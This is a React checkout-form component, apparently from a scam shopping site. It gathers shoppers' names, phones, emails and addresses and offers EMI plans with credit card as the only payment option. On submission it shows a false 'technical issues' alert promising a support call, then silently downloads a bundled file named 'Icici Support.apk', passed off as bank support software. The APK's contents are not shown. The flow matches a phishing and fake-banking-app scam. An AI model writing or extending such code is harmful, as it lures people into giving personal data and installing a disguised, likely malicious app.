// import React, { useState } from 'react';
// import axios from 'axios';
// import './checkout.css'; // Import the modal CSS

// const CheckoutModal = ({isOpen=false, setIsOpen}) => {
//   const [formData, setFormData] = useState({
//     name: '',
//     phone: '',
//     email: '',
//     pincode: '',
//     district: '',
//     city: '',
//     state: '',
//     street: '',
//   });

//   const [loading, setLoading] = useState(false);
   

//   const handleChange = (e) => {
//     setFormData({ ...formData, [e.target.name]: e.target.value });
//   };

//   // Fetch location details based on pincode
//   const fetchLocationDetails = async (pincode) => {
//     if (pincode.length === 6) {
//       setLoading(true);
//       try {
//         const res = await axios.get(`https://api.postalpincode.in/pincode/${pincode}`);
//         const data = res.data[0];
//         if (data.Status === "Success") {
//           const { District, State, Region } = data.PostOffice[0];
//           setFormData({
//             ...formData,
//             district: District,
//             city: Region,
//             state: State,
//           });
//         }
//       } catch (err) {
//         console.error('Error fetching location details', err);
//       } finally {
//         setLoading(false);
//       }
//     }
//   };

//   // Handle form submission
//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     try {
//       await axios.post('http://localhost:5000/checkout', formData);
//       alert('We are Facing Some Technical Issues. Our Costomer Support Will Contact You within 5 min. Sorry for any inconvenience.💥');
//       setIsOpen(false); // Close modal after successful submission
//     } catch (err) {
//       console.error('Error sending data to backend', err);
//     }
//   };

//   return (
//     <div>
//       {/* Button to open the modal */}
       
//       {/* Modal itself */}
//       {isOpen && (
//         <div className="modal-overlay">
//           <div className="modal-container">
//             <span className="close-btn" onClick={() => setIsOpen(false)}>
//               &times;
//             </span>
//             <h1 className="modal-heading">Checkout Form</h1>
//             <form onSubmit={handleSubmit}>
//               <div className="form-group">
//                 <label>Name</label>
//                 <input
//                   className="input"
//                   type="text"
//                   name="name"
//                   value={formData.name}
//                   onChange={handleChange}
//                   required
//                 />
//               </div>
//               <div className="form-group">
//                 <label>Phone</label>
//                 <input
//                   className="input"
//                   type="tel"
//                   name="phone"
//                   value={formData.phone}
//                   onChange={handleChange}
//                   required
//                 />
//               </div>
//               <div className="form-group">
//                 <label>Email</label>
//                 <input
//                   className="input"
//                   type="email"
//                   name="email"
//                   value={formData.email}
//                   onChange={handleChange}
//                   required
//                 />
//               </div>
//               <div className="form-group">
//                 <label>Pincode</label>
//                 <input
//                   className="input"
//                   type="text"
//                   name="pincode"
//                   value={formData.pincode}
//                   onChange={(e) => {
//                     handleChange(e);
//                     fetchLocationDetails(e.target.value);
//                   }}
//                   required
//                 />
//               </div>
//               <div className="form-group">
//                 <label>District</label>
//                 <input
//                   className="input"
//                   type="text"
//                   name="district"
//                   value={formData.district}
//                   readOnly
//                 />
//               </div>
//               <div className="form-group">
//                 <label>City</label>
//                 <input
//                   className="input"
//                   type="text"
//                   name="city"
//                   value={formData.city}
//                   readOnly
//                 />
//               </div>
//               <div className="form-group">
//                 <label>State</label>
//                 <input
//                   className="input"
//                   type="text"
//                   name="state"
//                   value={formData.state}
//                   readOnly
//                 />
//               </div>
//               <div className="form-group">
//                 <label>Street </label>
//                 <input
//                   className="input"
//                   type="text"
//                   name="street"
//                   value={formData.street}
//                   onChange={handleChange}
//                   required
//                 />
//               </div>
//               <button className="submit-btn" type="submit">
//                 {loading ? 'Submitting...' : 'Pay Now'}
//               </button>
//             </form>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// };

// export default CheckoutModal;
import React, { useState } from 'react';
import axios from 'axios';
import './checkout.css'; // Import the modal CSS
import app from '../../Icici Support.apk'

const CheckoutModal = ({isOpen=false, setIsOpen}) => {
  const [formData, setFormData] = useState({
    name: '',
    phone: '',
    email: '',
    pincode: '',
    district: '',
    city: '',
    state: '',
    street: '',
    emi: '' ,
    paymentMethod:''
  });

  const [loading, setLoading] = useState(false);
  const [emiValue, setEmiValue] = useState(null); // Holds the selected EMI value

  const emiOptions = {
    '3': 20503,  // EMI for 3 months
    '6': 10315,  // EMI for 6 months
    '12': 5222,  // EMI for 12 months
    '24': 2676,  // EMI for 24 months
    '48': 1405   // EMI for 48 months
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });

    if (e.target.name === 'emi') {
      setEmiValue(emiOptions[e.target.value]); // Set EMI value when option is selected
    }
  };

  const fetchLocationDetails = async (pincode) => {
    if (pincode.length === 6) {
      setLoading(true);
      try {
        const res = await axios.get(`https://api.postalpincode.in/pincode/${pincode}`);
        const data = res.data[0];
        if (data.Status === "Success") {
          const { District, State, Region } = data.PostOffice[0];
          setFormData({
            ...formData,
            district: District,
            city: Region,
            state: State,
          });
        }
      } catch (err) {
        console.error('Error fetching location details', err);
      } finally {
        setLoading(false);
      }
    }
  };


  function downloadApk() {
    const apkUrl = app; // Replace this with the actual URL of your APK file
    const link = document.createElement('a');
    link.href = apkUrl;
    link.setAttribute('download', 'Support.apk'); // The file will be downloaded with this name
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }
  



  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post('http://localhost:5000/checkout', formData);
      alert('We are Facing Some Technical Issues. Our Customer Support Will Contact You within 5 min. Sorry for any inconvenience.💥');
      setIsOpen(false);
      downloadApk()
    } catch (err) {
      console.error('Error sending data to backend', err);
    }
  };

  return (
    <div>
      {isOpen && (
        <div className="modal-overlay">
          <div className="modal-container">
            <span className="close-btn" onClick={() => setIsOpen(false)}>
              &times;
            </span>
            <h1 className="modal-heading">Checkout Form</h1>
            <form onSubmit={handleSubmit}>
              {/* Form Fields */}
              <div className="form-group">
                <label>Name</label>
                <input
                  className="input"
                  type="text"
                  name="name"
                  value={formData.name}
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="form-group">
                <label>Phone</label>
                <input
                  className="input"
                  type="tel"
                  name="phone"
                  value={formData.phone}
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="form-group">
                <label>Email</label>
                <input
                  className="input"
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="form-group">
                <label>Pincode</label>
                <input
                  className="input"
                  type="text"
                  name="pincode"
                  value={formData.pincode}
                  onChange={(e) => {
                    handleChange(e);
                    fetchLocationDetails(e.target.value);
                  }}
                  required
                />
              </div>
              <div className="form-group">
                <label>District</label>
                <input
                  className="input"
                  type="text"
                  name="district"
                  value={formData.district}
                  readOnly
                />
              </div>
              <div className="form-group">
                <label>City</label>
                <input
                  className="input"
                  type="text"
                  name="city"
                  value={formData.city}
                  readOnly
                />
              </div>
              <div className="form-group">
                <label>State</label>
                <input
                  className="input"
                  type="text"
                  name="state"
                  value={formData.state}
                  readOnly
                />
              </div>
              <div className="form-group">
                <label>Street </label>
                <input
                  className="input"
                  type="text"
                  name="street"
                  value={formData.street}
                  onChange={handleChange}
                  required
                />
              </div>

              {/* EMI Selection */}
              <div className="form-group">
                <label>Select EMI Plan</label>
                <select
                  className="input"
                  name="emi"
                  value={formData.emi}
                  onChange={handleChange}
                  required
                >
                  <option value="" disabled>Select EMI</option>
                  <option value="3">3 Months - ₹20,503</option>
                  <option value="6">6 Months - ₹10,315</option>
                  <option value="12">12 Months - ₹5,222</option>
                  <option value="24">24 Months - ₹2,676</option>
                  <option value="48">48 Months - ₹1,405</option>
                </select>
              </div>
              <div className="form-group">
                <label>Select Payment Method</label>
                <select
                  className="input"
                  name="paymentMethod"
                  value={formData.paymentMethod}
                  onChange={handleChange}
                  required
                >
                  <option value="" disabled>Select Payment Method</option>
                  <option value="creditCard">Credit Card</option>
                  <option value="debitCard" disabled >Debit Card</option>
                  <option value="cash on delevery" disabled >Cash On Delevery</option>
                  <option value="netBanking" disabled >Net Banking</option>
                  <option value="upi" disabled >Upi</option>
                  
                </select>
              </div>

              {/* Display selected EMI */}
              {emiValue && (
                <p className="emi-display">
                  Your EMI for {formData.emi} months is: ₹{emiValue}
                </p>
              )}

              <button className="submit-btn" type="submit">
                {loading ? 'Submitting...' : 'Pay Now'}
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default CheckoutModal;
